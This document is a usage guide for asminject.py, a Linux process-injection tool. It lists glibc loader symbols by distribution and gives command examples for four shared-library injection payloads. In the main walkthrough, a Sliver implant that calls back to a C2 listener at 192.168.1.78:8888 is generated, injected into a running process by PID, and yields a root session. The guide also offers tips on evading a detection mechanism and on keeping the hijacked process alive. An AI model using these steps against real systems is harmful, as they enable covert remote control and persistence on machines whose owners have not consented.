# asminject.py examples - Shared library injection

* [Background](#background)
* [Important](#important)
* [dlopen with multithreading](#dlopen-with-multithreading)
* [_dl_open with multithreading](#_dl_open-with-multithreading)
* [dlopen without multithreading](#dlopen-without-multithreading)
* [_dl_open without multithreading](#_dl_open-without-multithreading)

## Background

Injecting a shared library (`.so` file) into an existing process was the entire purpose of the [dlinject.py](https://github.com/DavidBuchanan314/dlinject) tool that `asminject.py` was originally derived from. `asminject.py` includes several payloads to achieve the same type of goal, depending on the specifics of the Linux distribution where you're running it.

When `asminject.py` was originally developed, `dlinject.py` was hardcoded to look for a function named `_dl_open` in the `ld` library and call it. However, at least in 2021, not every Linux distribution included a version of the `ld` library that exported `_dl_open` or an equivalent function. Here are the permutations I've discovered so far while testing `asminject.py`:

* Debian and derivatives
  * Debian
    * Debian 8.11, x86-64
	  * `libc` version is Debian GLIBC 2.19-18+deb8u10
      * `ld` library does not export `_dl_open`
	  * `libc` library exports `__libc_dlopen_mode`
	  * `libdl` library exports `dlopen`
    * Debian 10.6, ARM32 (Raspberry Pi)
	  * `libc` version is Debian GLIBC 2.28-10+rpi1
      * `ld` library does not export `_dl_open`
	  * `libc` library exports `__libc_dlopen_mode`
	  * `libdl` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
	* Debian 11.0 x86-64
	  * `libc` version is Debian GLIBC 2.31-13
      * `ld` library does not export `_dl_open`
	  * `libc` library exports `__libc_dlopen_mode`
	  * `libdl` library exports `dlopen`
  * Kali
    * kali-rolling (updated in June 2022), x86-64
      * `libc` version is Debian GLIBC 2.33-6
      * `ld` library does not export `_dl_open`
      * `libc` library exports `__libc_dlopen_mode`
      * `libdl` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
  * Ubuntu
    * Ubuntu 22.04, x86-64
      * `libc` version is GLIBC 2.35-0ubuntu3.1
      * `ld` library does not export `_dl_open`
      * `libc` library exports `dlopen`
      * `libdl` library does not export `dlopen`
* OpenSUSE
  * OpenSUSE Tumbleweed 20220719, x86 (32-bit) and OpenSUSE Tumbleweed 20220731, x86-64
    * `libc` version is GNU libc 2.35
    * `ld` library exports `_dl_open`, and the signature should be `void * _dl_open(const char *file, int mode, const void *caller_dlopen, Lmid_t nsid, int argc, char *argv[], char *env[]);`
	* `libc` library exports `dlopen` with signature `void *dlopen([const] char *filename, int flags);`
	* `libdl` library does not export `dlopen`
* Arch
  * Arch 20220701, x86-64
    * `libc` version is GNU libc 2.36
    * `ld` library does not export `_dl_open`
	* `libc` library exports `dlopen`
	* `libdl` library does not export `dlopen`

Some (older?) versions of `ld` allegedly use(d?) a simpler signature for `_dl_open`: `void * _dl_open(const char *file, int mode, const void *caller_dlopen);`, but I haven't run across this yet in order to test it.

In most cases, you should be able to use the first example below, because it handles both the `libdl` and `libc` variations on calling the `dlopen` function, and it's multithreaded, so the target process should continue as usual after the code is injected. The other options are provided for more constrained scenarios, e.g. if the target process doesn't have `libpthread` available, or if it's more advantageous to call `_dl_open` to avoid a particular detection mechanism.

## Important

Regardless of the payload and shared library you select, in virtually all cases you should avoid causing the shared library to issue a process-level `exit`, as this will cause the target process to exit as well. In my testing, common C2 agents for Linux will perform a system-level exit instead of a thread-level exit. I assume this is because unlike Windows, where calling a thread-level `exit` is more or less the same across versions, locating and calling the `pthread_exit` function on an arbitrary Linux distribution and version is more complicated, and so most(?) C2 authors don't implement it.

In the case of [Sliver](https://github.com/BishopFox/sliver) and [Metasploit](https://github.com/rapid7/metasploit-framework), what this means is that instead of e.g. calling `kill` in a Sliver session or `exit` in a Meterpreter session, you should just send the session to the background unless you absolutely want the target process to exit.

## dlopen with multithreading

The `dlinject-threaded.s` payload is the preferred option for injecting shared libraries into an existing process using `asminject.py`. It is the most straightfoward, best supported on various distributions (at least in my testing), and the target process will continue executing normally after injection.

This payload requires one variable: `librarypath`, which should point to the library you want to inject.

This payload requires relative offsets for the `ld` shared library used by the target process.

Locate or build a `.so` file to open. The example below uses a [Sliver](https://github.com/BishopFox/sliver) C2 listener and implant.

Note: in this example, the `--arch=386` option for the implant generation is specified because the corresponding `asminject.py` example below is using the `x86` architecture. For `x86-64`, you'd want to use `--arch=amd64`. For `arm32`, you could try using `--arch=arm`, but as of this writing Sliver doesn't seem to handle it well. I was going to include an example that used the `linux/armle/meterpreter/reverse_tcp` payload from Metasploit instead, but it seems that `elf-so` output for that payload isn't working at present.

```
# ./sliver-server     

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain infect
[*] Server v1.5.17 - 814670dc6d023f290fefd3e0fd7e0c420f9bb2e8
[*] Welcome to the sliver shell, please type 'help' for options

...omitted for brevity...

[server] sliver > mtls

[*] Starting mTLS listener ...

[server] sliver > jobs

 ID   Name   Protocol   Port 
==== ====== ========== ======
 2    mtls   tcp        8888 

[server] sliver > generate --mtls=192.168.1.78:8888 --os=linux --arch=386 --format=shared --save=/home/user --skip-symbols

[*] Generating new linux/386 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 00:01:48
[*] Implant saved to /home/user/MAGENTA_NEEDLE.so
```

Inject the DLL into the target process:

```
# python3 ./asminject.py 30320 dlinject-threaded.s \
   --relative-offsets-from-binaries \
   --var librarypath "/home/user/MAGENTA_NEEDLE.so"
```

Back in the Sliver console, you should see something like this:

```
[*] Session 5abe2db4 MAGENTA_NEEDLE - 192.168.1.79:5976 (localhost.localdomain) - linux/386 - Fri, 29 Jul 2022 15:35:21 PDT

[server] sliver > sessions -i 5abe2db4

[*] Active session MAGENTA_NEEDLE (5abe2db4)

[server] sliver (MAGENTA_NEEDLE) > info

        Session ID: 5abe2db4-cf75-46aa-bb41-7ad288028f0d
              Name: MAGENTA_NEEDLE
          Hostname: localhost.localdomain
              UUID: 0f444f35-de17-41a3-bc44-c30405c83d04
          Username: root
               UID: 0
               GID: 0
               PID: 30320
                OS: linux
           Version: Linux localhost.localdomain 5.18.11-1-pae
              Arch: 386
         Active C2: mtls://192.168.1.78:8888
    Remote Address: 192.168.1.79:5976
         Proxy URL: 
Reconnect Interval: 1m0s
```

## _dl_open with multithreading

The `dlinject-ld-threaded.s` payload mimics the original `dlinject.py`, calling the `_dl_open` function that some versions of the `ld` library export (e.g. on OpenSUSE), and is multithreaded so that the target process continues executing normally after injection. `dlinject-ld-threaded.s` is currently only provided for the x86 and x86-64 architectures, because I haven't found an ARM32 Linux distribution that includes a version of `ld` that exports the `_dl_open` symbol yet.

```
# python3 ./asminject.py 30320 dlinject-ld-threaded.s \
   --relative-offsets-from-binaries \
   --var librarypath "/home/user/MAGENTA_NEEDLE.so"
```
## dlopen without multithreading

The `dlinject.s` payload is identical to the `dlinject-threaded.s` payload, except that it does not spawn a separate thread. This has the downside of not allowing the target process to keep executing normally after injection, but means that `libpthread` is not required. Just swap out the payload name, e.g.:

```
# python3 ./asminject.py 30320 dlinject.s \
   --relative-offsets-from-binaries \
   --var librarypath "/home/user/MAGENTA_NEEDLE.so"
```

## _dl_open without multithreading

The `dlinject-ld.s` payload is identical to `dlinject-ld-threaded.s`, except that it does not call `_dl_open` in a separate thread. Like `dlinject.s`, this means that the `libpthread` library functions are not required, but it also means that the target process will stop doing its normal work in favour of whatever the injected code starts doing. `dlinject-ld.s` is currently only provided for the x86 and x86-64 architectures, because I haven't found an ARM32 Linux distribution that includes a version of `ld` that exports the `_dl_open` symbol yet.

```
# python3 ./asminject.py 30320 dlinject-ld.s \
   --relative-offsets-from-binaries \
   --var librarypath "/home/user/MAGENTA_NEEDLE.so"
```
